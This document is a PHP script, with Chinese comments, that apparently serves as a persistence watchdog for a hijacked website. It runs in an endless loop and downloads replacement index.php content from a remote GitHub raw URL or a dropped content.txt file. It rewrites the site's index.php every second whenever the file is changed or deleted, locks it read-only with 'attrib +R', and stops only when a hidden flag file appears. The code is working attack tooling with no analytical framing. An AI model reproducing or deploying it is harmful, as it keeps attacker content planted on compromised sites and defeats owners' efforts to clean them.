<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ignore_user_abort(true);
set_time_limit(0);

$stopFlag = 'roobts.txt';
$targetFile = 'index.php';
$sourceFile = 'content.txt';
$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-www.xzsizxh.cn-/refs/heads/main/index.php';

file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Script started\n", FILE_APPEND);

$code = null;
$originalContent = null;

// 获取原始文件内容（用于比较）
if (file_exists($targetFile)) {
    $originalContent = file_get_contents($targetFile);
}

while (true) {
    if (file_exists($stopFlag)) {
        @unlink($stopFlag);
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Stop flag detected. Exiting.\n", FILE_APPEND);
        break;
    }

    $shouldUpdate = false;
    
    // 尝试读取 content.txt
    if (file_exists($sourceFile)) {
        $newCode = file_get_contents($sourceFile);
        @unlink($sourceFile);
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt updated and deleted\n", FILE_APPEND);

        if ($code === null || md5($newCode) !== md5($code)) {
            $code = $newCode;
            $shouldUpdate = true;
        }
    }
    // 如果本地没有 content.txt，就尝试远程下载
    elseif ($code === null) {
        $newCode = @file_get_contents($remoteURL);
        if ($newCode !== false) {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt fetched from remote\n", FILE_APPEND);
            $code = $newCode;
            $shouldUpdate = true;
        } else {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to fetch remote content\n", FILE_APPEND);
        }
    }

    // 检查目标文件是否需要恢复
    if ($code !== null) {
        $needsRestore = false;
        $restoreReason = "";
        
        // 检查文件是否存在
        if (!file_exists($targetFile)) {
            $needsRestore = true;
            $restoreReason = "file_missing";
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file missing\n", FILE_APPEND);
        } 
        // 检查文件内容是否被修改
        else {
            $currentContent = @file_get_contents($targetFile);
            
            if ($currentContent === false) {
                $needsRestore = true;
                $restoreReason = "cannot_read";
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Cannot read target file\n", FILE_APPEND);
            } 
            // 检查内容是否被修改
            elseif (md5($currentContent) !== md5($code)) {
                $needsRestore = true;
                $restoreReason = "content_modified";
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file content modified\n", FILE_APPEND);
                
                // 更新原始内容记录
                $originalContent = $currentContent;
            }
        }
        
        // 如果需要恢复或者有新的更新
        if ($needsRestore || $shouldUpdate) {
            $result = file_put_contents($targetFile, $code);
            if ($result !== false) {
                // 在Windows中设置只读属性
                @exec('attrib +R "' . $targetFile . '"', $output, $returnCode);
                
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " {$targetFile} restored (reason: {$restoreReason})\n", FILE_APPEND);
                
                // 检查是否成功设置只读属性
                if ($returnCode === 0) {
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Read-only attribute set successfully\n", FILE_APPEND);
                } else {
                    file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to set read-only attribute\n", FILE_APPEND);
                }
            } else {
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to restore {$targetFile}\n", FILE_APPEND);
            }
        }
        
        // 额外检查：如果文件不是只读的，重新设置只读属性
        if (file_exists($targetFile)) {
            // 检查文件是否可写（在Windows中这可以间接判断是否设置了只读属性）
            if (is_writable($targetFile)) {
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " File is writable, setting read-only attribute\n", FILE_APPEND);
                @exec('attrib +R "' . $targetFile . '"');
            }
        }
    } else {
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " No content available yet\n", FILE_APPEND);
    }

    sleep(1); // 每秒检查一次
}
